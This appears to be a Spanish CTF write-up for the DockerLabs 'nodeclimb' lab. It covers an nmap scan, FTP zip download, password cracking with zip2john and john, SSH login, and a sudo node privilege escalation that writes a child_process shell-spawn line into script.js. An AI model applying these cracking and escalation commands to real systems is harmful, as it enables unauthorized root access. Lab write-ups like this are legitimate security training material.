nmap: 21,22

![[dockerlabs/facil/nodeclimb/nmap.png]]

vamos al ftp y nos pasamos el zip

![[zip.png]]

y nos pide contraseña

![[zip2.png]]

ahora sacamos la contraseña con el comando

     zip2john secretitopicaron.zip

después 

     john has_zip


y da

![[jhon1.png]]

ahora sacamos el zip

![[password.png]]

y obtenemos la contraseña y usuario, entramos por el ssh, ahora entramos

![[dockerlabs/facil/nodeclimb/conexion.png]]

al hacer sudo -l podemos ver que hay un archivo script.js pero no tiene nada dentro, pero igual esta el node

![[dockerlabs/facil/nodeclimb/script.png]]

buscamos el node: https://gtfobins.github.io/gtfobins/node/
dentro del script.js que esta vacío colocamos este comando

     require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]}) 

y ejecutamos el script

     sudo /usr/bin/node /home/mario/script.js

![[dockerlabs/facil/nodeclimb/root.png]]

y somos root!